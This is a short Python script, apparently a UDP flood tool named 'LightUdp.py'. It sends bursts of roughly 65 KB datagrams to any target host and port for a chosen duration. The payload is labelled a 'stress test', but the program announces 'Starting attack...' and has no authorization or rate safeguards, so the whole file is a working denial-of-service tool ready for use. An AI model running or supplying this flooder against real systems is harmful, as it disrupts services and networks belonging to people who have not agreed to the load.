import asyncio
import socket
import sys

def AdjiXTenLight(size):
    return b'TenLight Stress test' * (size // len(b'TenLight Stress test'))

async def send_payload(target, port, payload):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        for _ in range(50):
            sock.sendto(payload, (target, port))

async def main():
    if len(sys.argv) != 4:
        print("Made by adjidev\nUsage: python LightUdp.py <target> <port> <duration>")
        return

    t = sys.argv[1]
    p = int(sys.argv[2])
    duration = int(sys.argv[3])

    payload = AdjiXTenLight(65500)
    stop = asyncio.get_event_loop().time() + duration

    print("Starting attack...")
    while asyncio.get_event_loop().time() < stop:
        await send_payload(t, p, payload)
        await asyncio.sleep(0.01)  

    print("Attack stopped.")

if __name__ == "__main__":
    asyncio.run(main())
